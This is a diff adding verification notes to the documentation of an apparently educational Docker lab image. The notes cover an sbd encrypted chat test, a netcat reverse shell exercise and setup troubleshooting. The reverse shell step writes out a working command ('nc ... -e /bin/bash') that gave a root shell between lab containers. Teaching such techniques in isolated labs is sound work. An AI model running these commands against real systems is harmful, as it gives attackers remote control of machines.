@@ -31,3 +31,31 @@ Verified Tools (Image Version :1)
     ncat/nc: Traditional version for Exercise 9 (Reverse Shells).
 
     iputils-ping: For connectivity testing between nodes.
+
+
+Technical Verification Tests
+
+The following exercises were successfully verified using the csi-lab-nc:1 image.
+1. Encrypted Chat (sbd)
+
+    Receiver: sbd -l -p 4444
+
+    Sender: sbd nc-lab-receiver 4444
+
+    Result: Confirmed encrypted text transfer: "this is a test for my lab container".
+
+2. Reverse Shell (nc)
+
+    Attacker (Sender): nc -lvp 1234
+
+    Victim (Receiver): nc nc-lab-sender 1234 -e /bin/bash
+
+    Proof: Running whoami on the attacker terminal returned root.
+
+Troubleshooting & Lessons Learned
+
+    BIOS Virtualization: If Docker fails with a "daemon" error, ensure Virtualization is "Enabled" in Task Manager > Performance > CPU. Physical BIOS settings must be toggled regardless of Windows feature settings.
+
+    sbd Syntax: The listen flag is a lowercase -l (listen), not the number -1. Using the number will cause the tool to fail silently.
+
+    DNS Resolution: Communication between containers should use their assigned names (e.g., nc-lab-receiver) to leverage Docker's internal DNS bridge.
